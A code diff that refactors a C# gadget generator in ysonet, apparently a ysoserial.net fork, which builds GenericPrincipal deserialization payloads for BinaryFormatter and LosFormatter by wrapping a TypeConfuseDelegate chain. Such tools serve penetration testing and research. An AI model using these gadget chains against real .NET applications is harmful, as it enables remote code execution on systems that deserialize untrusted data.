@@ -1,13 +1,9 @@
-﻿using System;
-using System.Collections;
+﻿using NDesk.Options;
+using System;
 using System.Collections.Generic;
-using System.ComponentModel.Design;
-using ysonet.Helpers;
 using System.IO;
-using System.Reflection;
-using System.Web.UI.WebControls;
+using ysonet.Helpers;
 using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;
-using NDesk.Options;
 
 namespace ysonet.Generators
 {
@@ -19,11 +15,6 @@ namespace ysonet.Generators
             return new List<string> { "BinaryFormatter", "LosFormatter" }; // SoapFormatter for the curious!
         }
 
-        public override string Name()
-        {
-            return "GenericPrincipal";
-        }
-
         public override string Finders()
         {
             return "Soroush Dalili";
@@ -31,7 +22,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.BridgeAndDerived, "OnDeserialized" , "SecondOrderDeserialization"}; //inherits ClaimsPrincipal
+            return new List<string> { GadgetTags.Bridged, GadgetTags.OnDeserialized, GadgetTags.SecondOrderDeserialization }; //inherits ClaimsPrincipal
         }
 
         public override OptionSet Options()
@@ -54,18 +45,18 @@ namespace ysonet.Generators
             byte[] binaryFormatterPayload;
             if (BridgedPayload != null)
             {
-                binaryFormatterPayload = (byte[]) BridgedPayload;
+                binaryFormatterPayload = (byte[])BridgedPayload;
             }
             else
             {
-                binaryFormatterPayload = (byte[]) (new TypeConfuseDelegateGenerator()).GenerateWithNoTest("BinaryFormatter", inputArgs);
+                binaryFormatterPayload = (byte[])(new TypeConfuseDelegateGenerator()).GenerateWithNoTest("BinaryFormatter", inputArgs);
             }
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
             string bfPayload1 = "";
             string bfPayload2 = "";
 
-            if(variant_number == 1)
+            if (variant_number == 1)
             {
                 bfPayload1 = b64encoded;
             }
